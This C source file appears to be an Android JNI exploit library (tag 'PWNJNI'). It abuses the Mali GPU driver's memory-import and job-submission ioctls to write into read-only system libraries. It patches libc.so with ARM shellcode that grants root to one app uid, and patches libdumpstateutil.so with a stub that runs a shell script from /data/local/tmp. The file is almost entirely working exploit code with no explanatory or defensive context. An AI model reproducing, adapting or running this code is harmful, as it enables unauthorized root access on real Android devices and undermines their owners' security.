#include <jni.h>
#include <android/log.h>
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, "PWNJNI", __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, "PWNJNI", __VA_ARGS__)
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KT 0x80
struct vc_t { uint16_t major, minor; };
struct sf_t { uint32_t create_flags; };
union ma_t { struct { uint64_t va_pages, commit_pages, extension, flags; } in;
             struct { uint64_t flags, gpu_va; } out; };
struct iub { uint64_t ptr, length; };
union mi_t { struct { uint64_t flags, phandle; uint32_t type, padding; } in;
             struct { uint64_t flags, gpu_va, va_pages; } out; };
struct js_t { uint64_t addr; uint32_t nr_atoms, stride; };
struct atom_v2 { uint64_t jc; uint64_t udata[2]; uint64_t extres_list;
    uint16_t nr_extres; uint16_t compat_core_req; uint8_t pre_dep[4];
    uint8_t atom_number, prio, device_nr, padding; uint32_t core_req; } __attribute__((packed));
struct extres { uint64_t ext_resource; };
struct soft_ev { uint64_t event; uint32_t new_status, padding; };
#define IOC_VC _IOWR(KT,0,struct vc_t)
#define IOC_SF _IOW(KT,1,struct sf_t)
#define IOC_ALLOC _IOWR(KT,5,union ma_t)
#define IOC_SUBMIT _IOW(KT,2,struct js_t)
#define IOC_IMPORT _IOWR(KT,22,union mi_t)
#define IOC_SOFT _IOW(KT,28,struct soft_ev)
#define PAGE 0x1000

/* targeted setresuid payload: keep uid 0 only for uid 10014 (our app) */
static const uint8_t PAYLOAD[] = {
    0x1e,0x17,0x02,0xe3, 0x01,0x00,0x50,0xe1, 0x01,0x00,0x00,0x1a,
    0x00,0x00,0xa0,0xe3, 0x1e,0xff,0x2f,0xe1, 0xd0,0x70,0xa0,0xe3,
    0x00,0x00,0x00,0xef, 0x1e,0xff,0x2f,0xe1
};
static const uint8_t BRANCH[] = { 0x3e, 0x6c, 0xff, 0xea };

static int mali_fd; static uint64_t gEvent; static uint8_t *ev;

static int mali_setup(void) {
    mali_fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (mali_fd < 0) { LOGE("open mali failed errno=%d", errno); return -1; }
    struct vc_t vc = {10,6};
    if (ioctl(mali_fd, IOC_VC, &vc)) { LOGE("version_check failed errno=%d", errno); return -2; }
    struct sf_t sf = {0}; ioctl(mali_fd, IOC_SF, &sf);
    void *trk = mmap(NULL, PAGE, PROT_READ, MAP_SHARED, mali_fd, (off_t)(3ULL<<12));
    if (trk == MAP_FAILED) { LOGE("tracking mmap failed errno=%d", errno); return -3; }
    union ma_t a; memset(&a,0,sizeof a);
    a.in.va_pages=1; a.in.commit_pages=1; a.in.flags=0xF;
    if (ioctl(mali_fd, IOC_ALLOC, &a)) { LOGE("event alloc failed errno=%d", errno); return -4; }
    gEvent = a.out.gpu_va;
    ev = mmap(NULL, PAGE, PROT_READ|PROT_WRITE, MAP_SHARED, mali_fd, (off_t)gEvent);
    if (ev == MAP_FAILED) { LOGE("event mmap failed errno=%d", errno); return -5; }
    LOGI("mali setup ok event=%llx", (unsigned long long)gEvent);
    return 0;
}

static int mali_close(void) { if (mali_fd >= 0) close(mali_fd); mali_fd = -1; return 0; }

static int pc_patch(const char *path, uint64_t off, const uint8_t *bytes, int len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -10;
    uint64_t page = off & ~0xFFFULL;
    char *fm = mmap(NULL, PAGE, PROT_READ, MAP_SHARED, fd, (off_t)page);
    close(fd);
    if (fm == MAP_FAILED) return -11;
    void *anon = mmap(NULL, PAGE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    struct iub d = { (uint64_t)(uintptr_t)anon, PAGE };
    union mi_t imp; memset(&imp, 0, sizeof imp);
    imp.in.phandle = (uint64_t)(uintptr_t)&d; imp.in.type = 3; imp.in.flags = 0x1|0x2|0x4;
    if (ioctl(mali_fd, IOC_IMPORT, &imp)) { LOGE("import failed errno=%d", errno); return -12; }
    munmap(anon, PAGE);
    if (mremap(fm, PAGE, PAGE, MREMAP_MAYMOVE|MREMAP_FIXED, anon) == MAP_FAILED) { LOGE("mremap failed errno=%d", errno); return -13; }
    uint8_t *w = mmap(NULL, PAGE, PROT_READ|PROT_WRITE, MAP_SHARED, mali_fd, (off_t)imp.out.gpu_va);
    if (w == MAP_FAILED) { LOGE("alias mmap failed errno=%d", errno); return -14; }
    *ev = 0;
    struct extres ex = { imp.out.gpu_va };
    struct atom_v2 at; memset(&at, 0, sizeof at);
    at.jc = gEvent; at.extres_list = (uint64_t)(uintptr_t)&ex; at.nr_extres = 1;
    at.atom_number = 1; at.core_req = (1U<<8) | ((1U<<9)|5);
    struct js_t s = { (uint64_t)(uintptr_t)&at, 1, sizeof(at) };
    if (ioctl(mali_fd, IOC_SUBMIT, &s)) { LOGE("submit failed errno=%d", errno); return -15; }
    usleep(120000);
    memcpy(w + (off - page), bytes, len);
    int ok = memcmp(w + (off - page), bytes, len) == 0;
    struct soft_ev upd = { gEvent, 1, 0 };
    ioctl(mali_fd, IOC_SOFT, &upd);
    return ok ? 0 : -16;
}


static const uint8_t DS_STUB[] = { 0xff,0xb4,0x02,0x27,0x00,0xdf,0x00,0x28,0x0e,0xd1,0x84,0xb0,0x0c,0xa0,0x00,0x90,0x0f,0xa0,0x01,0x90,0x00,0x20,0x02,0x90,0x09,0xa0,0x69,0x46,0x00,0x22,0x0b,0x27,0x00,0xdf,0x00,0x20,0x01,0x27,0x00,0xdf,0xff,0xbc,0x0f,0xf2,0x0c,0x0c,0x03,0x4b,0xbc,0xeb,0x03,0x0c,0x60,0x47,0x00,0xbf,0x00,0x00,0x00,0x00,0x5f,0x3d,0x00,0x00,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x2f,0x64,0x61,0x74,0x61,0x2f,0x6c,0x6f,0x63,0x61,0x6c,0x2f,0x74,0x6d,0x70,0x2f,0x72,0x2e,0x73,0x68,0x00,0x00,0xbf,0x00,0x00,0x00,0x00 };
static const uint8_t DS_PTR[4] = { 0x01,0x62,0x00,0x00 };

/* fork one child per patch: the Mali primitive supports exactly one pc_patch
 * per process, and a second call in the same process hangs. */
static int apply_one(const char *path, uint64_t off, const uint8_t *bytes, int len)
{
    pid_t p = fork();
    if (p < 0) return -1;
    if (p == 0) {
        if (mali_setup() != 0) _exit(2);
        int r = pc_patch(path, off, bytes, len);
        mali_close();
        _exit(r == 0 ? 0 : 1);
    }
    int st = 0;
    waitpid(p, &st, 0);
    return WIFEXITED(st) ? WEXITSTATUS(st) : -2;
}

JNIEXPORT jint JNICALL Java_com_pwn_probe_Main_applyPatches(JNIEnv *env, jclass cls)
{
    int r = 0;
    r |= apply_one("/system/lib/libc.so", 0x25a90, PAYLOAD, sizeof(PAYLOAD));
    r |= apply_one("/system/lib/libdumpstateutil.so", 0x6200, DS_STUB, sizeof(DS_STUB));
    r |= apply_one("/system/lib/libdumpstateutil.so", 0x6d10, DS_PTR, 4);
    return r;
}

